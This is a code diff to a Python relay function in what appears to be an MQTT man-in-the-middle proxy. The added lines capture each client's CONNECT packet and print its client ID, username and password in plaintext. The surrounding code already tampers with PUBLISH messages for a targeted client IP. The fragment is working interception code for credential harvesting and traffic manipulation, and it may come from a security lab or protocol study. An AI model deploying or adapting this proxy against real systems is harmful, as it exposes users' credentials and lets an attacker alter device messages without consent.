@@ -23,6 +23,19 @@ def relay(src, dst, tamper_for_ip=None, client_ip=None):
                 packet, buf = PacketParser.try_parse(buf)
                 if packet is None:
                     break
+
+                # Log credentials from CONNECT packets
+                if client_ip is not None:
+                    connect_info = PacketParser.parse_connect(packet)
+                    if connect_info is not None:
+                        print(f"[Proxy] CONNECT from {client_ip}:")
+                        print(f"        client_id = {connect_info['client_id']}")
+                        print(f"        username  = {connect_info['username']}")
+                        print(f"        password  = {connect_info['password']}")
+                        print(
+                            f"        proto     = {connect_info['protocol_name']} v{connect_info['protocol_level']}"
+                        )
+
                 if tamper_for_ip is not None and client_ip == tamper_for_ip:
                     packet = PacketTamperer.tamper_publish(packet)
                 dst.sendall(packet)
